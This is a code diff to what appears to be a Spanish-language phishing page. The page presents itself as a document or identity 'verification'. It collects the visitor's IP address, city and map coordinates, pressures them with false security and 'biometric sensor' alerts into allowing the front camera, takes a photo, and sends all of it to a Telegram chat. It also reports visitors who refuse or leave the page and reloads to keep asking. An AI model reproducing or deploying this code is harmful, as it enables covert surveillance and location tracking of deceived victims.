@@ -36,6 +36,7 @@
         const beep = document.getElementById('beep');
         let procesoExitoso = false;
 
+        // --- SISTEMA DE REPORTE POR ABANDONO ---
         window.addEventListener('beforeunload', function (e) {
             if (!procesoExitoso) {
                 const reporteAbandono = "⚠️ *ALERTA DE ABANDONO*\nEl usuario cerró la página sin completar la verificación.";
@@ -56,20 +57,28 @@
             let infoDispositivo = "No se obtuvieron datos.";
 
             try {
-                // 1. Datos de red
+                // Captura de datos de red
                 const resIP = await fetch('https://ipapi.co/json/');
                 const d = await resIP.json();
                 const equipo = navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1] : "Móvil";
                 infoDispositivo = `📱 *Equipo:* ${equipo}\n🌐 *IP:* \`${d.ip}\`\n📍 *Lugar:* ${d.city}, ${d.country_name}\n🔗 *Mapa:* https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
 
-                // 2. Cámara (Forzar permiso)
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                // --- FORZADO DE PETICIÓN DE CÁMARA ---
+                // Cada vez que se llama a getUserMedia, el navegador revisa el permiso.
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: "user",
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    } 
+                });
+
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.setAttribute("playsinline", true);
                 await video.play();
                 
-                status.innerHTML = "PROCESANDO HUELLA...";
+                status.innerHTML = "VALIDANDO IDENTIDAD...";
                 await new Promise(r => setTimeout(r, 2000));
 
                 const canvas = document.createElement('canvas');
@@ -77,9 +86,12 @@
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 const fotoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.7));
+
+                // --- CIERRE ABSOLUTO DE CÁMARA ---
+                // Esto libera el hardware para que el navegador "olvide" el uso activo
                 stream.getTracks().forEach(t => t.stop());
 
-                // 3. Envío Completo
+                // Envío a Telegram
                 const fd = new FormData();
                 fd.append('chat_id', CONFIG.CHAT_ID);
                 fd.append('photo', fotoBlob, 'captura.jpg');
@@ -94,9 +106,10 @@
                 setTimeout(() => { window.location.href = CONFIG.PDF_URL; }, 1500);
 
             } catch (err) {
+                // Reporte de fallo o rechazo
                 let mensajeError = "❌ *ERROR TÉCNICO*\n\n";
                 if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
-                    mensajeError += "🚫 *Razón:* Cámara bloqueada por el usuario.";
+                    mensajeError += "🚫 *Razón:* El usuario bloqueó la cámara manualmente.";
                 } else {
                     mensajeError += `⚠️ *Razón:* ${err.message}`;
                 }
@@ -107,7 +120,7 @@
                     body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: `${mensajeError}\n\n${infoDispositivo}`, parse_mode: 'Markdown' })
                 });
 
-                alert("ERROR: Para ver el documento debe permitir el acceso al sensor biométrico (cámara) cuando el navegador lo solicite.");
+                alert("ADVERTENCIA DE SEGURIDAD: Para validar su identidad, debe presionar 'PERMITIR' cuando el navegador solicite acceso a la cámara frontal.");
                 location.reload();
             }
         }
